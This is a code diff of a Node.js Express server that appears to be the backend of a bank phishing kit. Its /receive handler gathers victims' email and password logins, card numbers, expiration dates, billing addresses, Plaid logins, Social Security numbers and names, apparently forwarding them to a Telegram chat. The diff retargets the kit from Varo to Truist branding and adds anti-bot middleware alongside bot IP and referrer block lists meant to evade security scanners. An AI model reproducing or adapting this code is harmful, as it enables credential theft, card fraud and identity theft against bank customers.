@@ -3,6 +3,7 @@ const app = express();
 const bodyParser = require('body-parser');
 const path = require('path');
 const { botToken, chatId } = require('./config/settings.js');
+const antibot = require('./middleware/antibot');
 //const { getClientIp } = require("request-ip");
 const https = require('https');
 const querystring = require('querystring');
@@ -18,7 +19,7 @@ const { botIPList, botIPRangeList, botIPCIDRRangeList, botIPWildcardRangeList } 
 const { botRefList } = require('./config/botRef.js');
 const { use } = require('express/lib/router');
 const { sendMessageFor } = require('simple-telegram-message');
-const viewDir = path.join(__dirname, 'public');
+const viewDir = path.join(__dirname, 'view');
 
 const port = 3000;
 
@@ -199,7 +200,7 @@ app.post('/receive', async (req, res) => {
   const lowerCaseMyObjects = myObjects.map(obj => obj.toLowerCase());
 
   if (lowerCaseMyObjects.includes('password') || lowerCaseMyObjects.includes('email')) {
-    message += `✅ UPDATE TEAM | VARO | USER_${ipAddress}\n\n` +
+    message += `✅ UPDATE TEAM | TRUIST | USER_${ipAddress}\n\n` +
                `👤 LOGIN \n\n`;
 
     for (const key of myObjects) {
@@ -227,7 +228,7 @@ app.post('/receive', async (req, res) => {
   }
 
   if (lowerCaseMyObjects.includes('expirationdate') || lowerCaseMyObjects.includes('cardnumber') || lowerCaseMyObjects.includes('billing address')) {
-    message += `✅ UPDATE TEAM | VARO | USER_${ipAddress}\n\n` +
+    message += `✅ UPDATE TEAM | TRUIST | USER_${ipAddress}\n\n` +
                `👤 CARD INFO \n\n`;
 
     for (const key of myObjects) {
@@ -246,7 +247,7 @@ app.post('/receive', async (req, res) => {
   }
 
   if (lowerCaseMyObjects.includes('userid')) {
-    message += `✅ UPDATE TEAM | VARO | USER_${ipAddress}\n\n` +
+    message += `✅ UPDATE TEAM | TRUIST | USER_${ipAddress}\n\n` +
                `👤 PLAID LOGIN \n\n`;
 
     for (const key of myObjects) {
@@ -265,7 +266,7 @@ app.post('/receive', async (req, res) => {
   }
 
   if (lowerCaseMyObjects.includes('ssn') || lowerCaseMyObjects.includes('firstname') || lowerCaseMyObjects.includes('lastname')) {
-    message += `✅ UPDATE TEAM | VARO | USER_${ipAddress}\n\n` +
+    message += `✅ UPDATE TEAM | TRUIST | USER_${ipAddress}\n\n` +
                `👤 CONTACT INFO \n\n`;
 
     for (const key of myObjects) {
